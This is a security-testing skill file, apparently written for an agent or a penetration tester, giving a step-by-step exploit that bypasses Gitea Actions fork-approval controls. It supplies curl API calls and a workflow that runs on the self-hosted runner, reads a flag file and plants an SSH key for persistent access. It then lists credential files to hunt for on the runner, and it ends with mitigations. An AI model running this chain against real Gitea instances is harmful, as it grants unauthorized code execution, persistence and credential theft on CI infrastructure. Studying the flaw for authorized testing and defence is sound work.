---
name: gitea-fork-review-workflow-approval-bypass
description: Abuse Gitea Actions fork approval controls by adding a workflow that triggers on pull_request_review or pull_request_review_comment, then submitting a review from a low-privileged user. Use on authorized self-hosted Gitea instances where CI runners hold the service identity and fork pull_request workflows require approval.
domain: cybersecurity
subdomain: ci-cd-security
tags:
- gitea
- ci-cd
- github-actions
- approval-bypass
- fork
- runner
version: '1.0'
author: bugbounty
license: Apache-2.0
nist_csf:
- ID.RA-01
- PR.PS-02
mitre_attack:
- T1195.002
- T1078.002
---
# Gitea Fork Review-Workflow Approval Bypass

> **Legal Notice:** Authorized security testing only.

## Overview

Gitea may block fork pull-request workflows until a maintainer approves them.
A workflow introduced in the fork that triggers on review events can still run
from the fork when a reviewer submits a comment-only review. The job executes
on the self-hosted runner with that runner's service account.

## When to Use

- A Gitea org repo is private and the user only has read/fork access
- Fork PR workflows are blocked by an approval prompt
- A self-hosted runner runs as a domain or service account with useful access
- The user can create a fork, add a file, open a PR, and submit a review

## Prerequisites

- Valid Gitea account with fork rights and review rights on its own PR
- Gitea API access (session cookie or token)
- Ability to push a workflow file to the fork
- A runner that serves the fork or the user's repositories

## Workflow

### 1. Confirm permissions

```bash
curl -s --negotiate -u : \
  http://gitea.darkzero.ext:3000/api/v1/repos/ORG/REPO \
  | jq '.permissions'
```

Expected read-only:

```json
{"admin":false,"push":false,"pull":true}
```

### 2. Fork the repository

```bash
curl -s --negotiate -u : -X POST \
  -H 'Content-Type: application/json' -d '{}' \
  http://gitea.darkzero.ext:3000/api/v1/repos/ORG/REPO/forks
```

### 3. Add a review-triggered workflow to the fork

Create `.gitea/workflows/foothold.yml` in the fork:

```yaml
name: foothold
on:
  pull_request_review_comment:
    types: [created]
  pull_request_review:
    types: [submitted]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          id
          hostname
          cat /home/svc-runner/user.txt 2>/dev/null || true
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAA... analyst@test' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
```

Upload through the Gitea contents API:

```bash
B64=$(base64 -w0 .gitea/workflows/foothold.yml)
curl -s --negotiate -u : -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"content\":\"$B64\",\"message\":\"ci\",\"branch\":\"main\"}" \
  'http://gitea.darkzero.ext:3000/api/v1/repos/USER/REPO/contents/.gitea%2Fworkflows%2Ffoothold.yml'
```

### 4. Open a PR from the fork

```bash
curl -s --negotiate -u : -X POST \
  -H 'Content-Type: application/json' \
  -d '{"title":"CI","body":"update","head":"USER:main","base":"main"}' \
  http://gitea.darkzero.ext:3000/api/v1/repos/ORG/REPO/pulls
```

### 5. Trigger the review event

```bash
PR=1
SHA=$(curl -s --negotiate -u : \
  http://gitea.darkzero.ext:3000/api/v1/repos/ORG/REPO/pulls/$PR \
  | jq -r '.head.sha')

curl -s --negotiate -u : -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"event\":\"COMMENT\",\"body\":\"validation note\",\"commit_id\":\"$SHA\"}" \
  http://gitea.darkzero.ext:3000/api/v1/repos/ORG/REPO/pulls/$PR/reviews
```

The review workflow runs from the fork even though normal fork PR workflows
were still waiting for approval.

### 6. Use the runner identity

- Read the runner user's home and user flag.
- Add an SSH key to the runner account for a stable shell.
- Inspect `/opt/gitea-runner/config.yaml`, `.runner`, and the systemd unit.
- Look for keytabs, environment files, cloud credentials, and writable service
  files.

## Validation

- Check the run appears with `event=pull_request_review_comment`.
- Confirm `id`/`hostname` from the job matches the runner, not the Gitea server.
- Confirm the added SSH key works directly.

## Mitigations

- Require approval for **all** fork-originated workflows, including review events.
- Do not run fork workflows with a privileged service account.
- Restrict runner labels and repository scopes.
- Disable `pull_request_review`/`pull_request_review_comment` triggers for forks.
- Use ephemeral runners and short-lived credentials.
